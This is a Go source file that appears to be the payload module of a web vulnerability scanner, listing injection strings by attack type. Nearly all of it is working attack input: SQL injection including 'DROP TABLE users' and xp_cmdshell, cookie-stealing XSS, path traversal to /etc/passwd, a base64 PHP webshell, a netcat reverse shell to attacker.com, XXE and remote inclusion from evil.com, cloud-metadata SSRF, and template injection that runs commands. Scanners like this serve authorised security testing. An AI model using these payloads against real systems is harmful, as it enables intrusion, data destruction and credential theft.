package payloads

var SQLiPayloads = []string{
	"'",
	"\"",
	"' OR '1'='1",
	"\" OR \"1\"=\"1",
	"' OR '1'='1'--",
	"' OR '1'='1'/*",
	"' OR 1=1--",
	"' OR 1=1#",
	"' OR 1=1/*",
	"') OR ('1'='1",
	"') OR ('1'='1'--",
	"1' ORDER BY 1--",
	"1' ORDER BY 2--",
	"1' ORDER BY 3--",
	"1' UNION SELECT NULL--",
	"1' UNION SELECT NULL,NULL--",
	"1' UNION SELECT NULL,NULL,NULL--",
	"admin'--",
	"admin' #",
	"admin'/*",
	"' HAVING 1=1--",
	"' GROUP BY columnname HAVING 1=1--",
	"1; DROP TABLE users--",
	"1'; EXEC xp_cmdshell('dir')--",
	"'; WAITFOR DELAY '0:0:5'--",
	"1 AND 1=1",
	"1 AND 1=2",
	"1' AND '1'='1",
	"1' AND '1'='2",
	"1' AND SLEEP(5)--",
	"1' AND BENCHMARK(10000000,SHA1('test'))--",
}

var XSSPayloads = []string{
	"<script>alert('XSS')</script>",
	"<script>alert(document.cookie)</script>",
	"<img src=x onerror=alert('XSS')>",
	"<svg onload=alert('XSS')>",
	"<body onload=alert('XSS')>",
	"<iframe src=\"javascript:alert('XSS')\">",
	"<input onfocus=alert('XSS') autofocus>",
	"<marquee onstart=alert('XSS')>",
	"<video><source onerror=alert('XSS')>",
	"<audio src=x onerror=alert('XSS')>",
	"\"><script>alert('XSS')</script>",
	"'><script>alert('XSS')</script>",
	"<script>alert(String.fromCharCode(88,83,83))</script>",
	"<IMG SRC=\"javascript:alert('XSS');\">",
	"<IMG SRC=javascript:alert('XSS')>",
	"<IMG SRC=JaVaScRiPt:alert('XSS')>",
	"<IMG SRC=`javascript:alert('XSS')`>",
	"<a href=\"javascript:alert('XSS')\">click</a>",
	"<div style=\"background:url(javascript:alert('XSS'))\">",
	"<style>@import'javascript:alert(\"XSS\")';</style>",
	"{{constructor.constructor('alert(1)')()}}",
	"${alert('XSS')}",
	"<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
}

var LFIPayloads = []string{
	"../../../etc/passwd",
	"....//....//....//etc/passwd",
	"..\\..\\..\\etc\\passwd",
	"/etc/passwd",
	"../../../../etc/passwd%00",
	"..%2F..%2F..%2Fetc%2Fpasswd",
	"..%252f..%252f..%252fetc%252fpasswd",
	"/etc/passwd%00.jpg",
	"....//....//....//etc//passwd",
	"/proc/self/environ",
	"/var/log/apache2/access.log",
	"/var/log/apache2/error.log",
	"/var/log/nginx/access.log",
	"/var/log/nginx/error.log",
	"C:\\Windows\\System32\\drivers\\etc\\hosts",
	"C:\\Windows\\win.ini",
	"C:\\boot.ini",
	"php://filter/convert.base64-encode/resource=index.php",
	"php://input",
	"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
	"expect://id",
	"file:///etc/passwd",
}

var RFIPayloads = []string{
	"http://evil.com/shell.txt",
	"http://evil.com/shell.txt%00",
	"https://evil.com/shell.php",
	"//evil.com/shell.txt",
	"\\\\evil.com\\shell.txt",
}

var CommandInjectionPayloads = []string{
	"; id",
	"| id",
	"|| id",
	"& id",
	"&& id",
	"`id`",
	"$(id)",
	"; ls -la",
	"| ls -la",
	"; cat /etc/passwd",
	"| cat /etc/passwd",
	"; whoami",
	"| whoami",
	"& whoami",
	"&& whoami",
	"`whoami`",
	"$(whoami)",
	"; ping -c 5 127.0.0.1",
	"| ping -c 5 127.0.0.1",
	"; sleep 5",
	"| sleep 5",
	"& sleep 5",
	"; nc -e /bin/sh attacker.com 4444",
	"| nc -e /bin/sh attacker.com 4444",
	"; dir",
	"| dir",
	"& dir",
	"&& dir",
	"| type C:\\Windows\\win.ini",
}

var XXEPayloads = []string{
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`,
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>`,
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo></foo>`,
}

var SSRFPayloads = []string{
	"http://127.0.0.1",
	"http://localhost",
	"http://127.0.0.1:22",
	"http://127.0.0.1:3306",
	"http://127.0.0.1:6379",
	"http://169.254.169.254/latest/meta-data/",
	"http://metadata.google.internal/computeMetadata/v1/",
	"http://169.254.169.254/metadata/v1/",
	"file:///etc/passwd",
	"dict://127.0.0.1:6379/INFO",
	"gopher://127.0.0.1:6379/_INFO",
	"http://[::]:80/",
	"http://0.0.0.0:80/",
	"http://0177.0.0.1/",
	"http://0x7f.0x0.0x0.0x1/",
	"http://2130706433/",
}

var SSTIPayloads = []string{
	"{{7*7}}",
	"${7*7}",
	"<%= 7*7 %>",
	"#{7*7}",
	"*{7*7}",
	"{{config}}",
	"{{self.__class__.__mro__[2].__subclasses__()}}",
	"{{''.__class__.__mro__[2].__subclasses__()}}",
	"${T(java.lang.Runtime).getRuntime().exec('id')}",
	"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
	"<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }",
	"{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
}

var OpenRedirectPayloads = []string{
	"//evil.com",
	"https://evil.com",
	"//evil.com/%2f..",
	"/\\evil.com",
	"/.evil.com",
	"///evil.com",
	"////evil.com",
	"https:evil.com",
	"http:evil.com",
	"//evil%E3%80%82com",
	"////evil.com/%2f%2e%2e",
	"https://evil.com/..;/",
}

var NoSQLiPayloads = []string{
	`{"$gt": ""}`,
	`{"$ne": null}`,
	`{"$ne": ""}`,
	`{"$regex": ".*"}`,
	`{"$where": "1==1"}`,
	`true, $where: '1 == 1'`,
	`', $where: '1 == 1'`,
	`1, $where: '1 == 1'`,
	`{ $where: "sleep(5000)" }`,
	`{"$or": [{"a": 1}, {"b": 2}]}`,
	`admin' && this.password.match(/.*/)//`,
}

var HeaderInjectionPayloads = []string{
	"test\r\nX-Injected: header",
	"test%0d%0aX-Injected:%20header",
	"test\r\nSet-Cookie: session=hacked",
	"test%0d%0aSet-Cookie:%20session=hacked",
	"test\r\n\r\n<script>alert('XSS')</script>",
}

func GetPayloadsByType(payloadType string) []string {
	switch payloadType {
	case "sqli":
		return SQLiPayloads
	case "xss":
		return XSSPayloads
	case "lfi":
		return LFIPayloads
	case "rfi":
		return RFIPayloads
	case "cmdi":
		return CommandInjectionPayloads
	case "xxe":
		return XXEPayloads
	case "ssrf":
		return SSRFPayloads
	case "ssti":
		return SSTIPayloads
	case "redirect":
		return OpenRedirectPayloads
	case "nosqli":
		return NoSQLiPayloads
	case "header":
		return HeaderInjectionPayloads
	case "all":
		var all []string
		all = append(all, SQLiPayloads...)
		all = append(all, XSSPayloads...)
		all = append(all, LFIPayloads...)
		all = append(all, CommandInjectionPayloads...)
		return all
	default:
		return nil
	}
}

func GetAvailablePayloadTypes() []string {
	return []string{
		"sqli", "xss", "lfi", "rfi", "cmdi",
		"xxe", "ssrf", "ssti", "redirect", "nosqli", "header", "all",
	}
}
